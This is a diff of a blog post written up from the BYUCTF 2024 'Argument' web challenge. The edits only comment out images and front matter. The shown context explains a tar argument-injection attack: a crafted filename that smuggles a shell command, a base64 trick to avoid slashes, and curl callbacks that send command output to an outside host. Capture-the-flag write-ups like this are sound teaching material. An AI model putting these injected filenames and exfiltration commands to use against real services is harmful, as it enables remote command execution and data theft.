@@ -4,19 +4,19 @@ date: 2024-05-21 23:39:59 +0200  # date +"%Y-%m-%d %H:%M:%S %z"
 categories: [BYUCTF2024, Web]
 tags: [web, tar]     # TAG names should always be lowercase
 author: happi
-description: On mai 2024, we paticipated to BYUCTF where we had the opportunity to work on this web challenge arround tar insecure use
-media_subpath: /assets/img/posts/byuctf24/argument
+# description: On mai 2024, we paticipated to BYUCTF where we had the opportunity to work on this web challenge arround tar insecure use
+# media_subpath: /assets/img/posts/byuctf24/argument
 ---
 
 # Argument
 
-![[enonce.png]]
+<!-- ![[enonce.png]] -->
 
 ## Description
 
 The website is rather simple. It is composed of a unique page which is an upload form :
 
-![[front.png]]
+<!-- ![[front.png]] -->
 
 It allows you to upload any files without any restriction. Once you've uploaded one or more file, you can download them and the application returns the uploaded files in a `.tar` archive.
 
@@ -143,7 +143,7 @@ curl -X POST -d 'Hello World!' https://happi.requestcatcher.com/test
 ```
 
 We upload the various files and and then... TADA!
-![[no-req.png]]
+<!-- ![[no-req.png]] -->
 
 Shit, we didn't get any callback, what the hell happened. Had to get back to source code to see what happened.
 
@@ -151,17 +151,17 @@ The challenge creator played a trick on us: the files are actually uploaded with
 
 What's left then ? To deal with this, we tried to use bash commands directly in the filename. We try to upload a file with name `--checksec-action=exec=sh curl -X POST -d 'Hello World!' https://happi.requestcatcher.com/test` directly and see if we can get a callback now.
 
-![[no-req-2.png]]
+<!-- ![[no-req-2.png]] -->
 
 Well, the answer is no :')
 
 If we look at the underlying request, we see that there is actually an issue with the filename.
-![[invalid_filename.png]]
+<!-- ![[invalid_filename.png]] -->
 
 By the way, it is not possible to use `/` in the filename, and thus in our payload. It is therefore not possible to use commands such as `cat /flag.txt`. Damn, that will makes things a bit harder.
 
 A simple trick to circumvent this is to base64 encode the payload :
-![[b64-encode-trick.png]]
+<!-- ![[b64-encode-trick.png]] -->
 
 We encode our callback payload :
 ```bash
@@ -170,12 +170,12 @@ curl -X POST -d "$(id)" https://happi.requestcatcher.com/test
 
 and this time, we finally get a callback !
 
-![[callback1.png]]
+<!-- ![[callback1.png]] -->
 
 We make a `ls /` to retrieve the name of the flag file and then we make a `cat`.
 
 
-![[pwned.png]]
+<!-- ![[pwned.png]] -->
 
 The flag is **`byuctf{argument_injection_stumped_me_the_most_at_D3FC0N_last_year}`** !
 
